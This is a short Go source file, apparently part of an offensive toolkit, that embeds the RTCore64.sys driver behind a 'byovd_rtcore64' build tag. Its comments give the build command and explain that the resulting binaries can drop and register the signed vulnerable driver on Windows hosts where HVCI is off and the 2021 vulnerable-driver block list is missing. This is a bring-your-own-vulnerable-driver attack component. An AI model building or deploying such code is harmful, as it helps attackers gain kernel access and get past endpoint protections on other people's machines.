//go:build windows && byovd_rtcore64

package rtcore64

import _ "embed"

//go:embed RTCore64.sys
var rtcore64Bytes []byte

// loadDriverBytes returns the embedded RTCore64.sys bytes. Active
// only under the `byovd_rtcore64` build tag — the default-build
// variant in embed_windows.go returns ErrDriverBytesMissing.
//
// Build with:
//
//	go build -tags=byovd_rtcore64 ./...
//
// Resulting binaries carry the signed driver in their `.rdata`
// section and can drop + register it via Driver.Install on hosts
// where HVCI is off and the build pre-dates the 2021-09 Microsoft
// vulnerable-driver block-list update.
func loadDriverBytes() ([]byte, error) {
	return rtcore64Bytes, nil
}
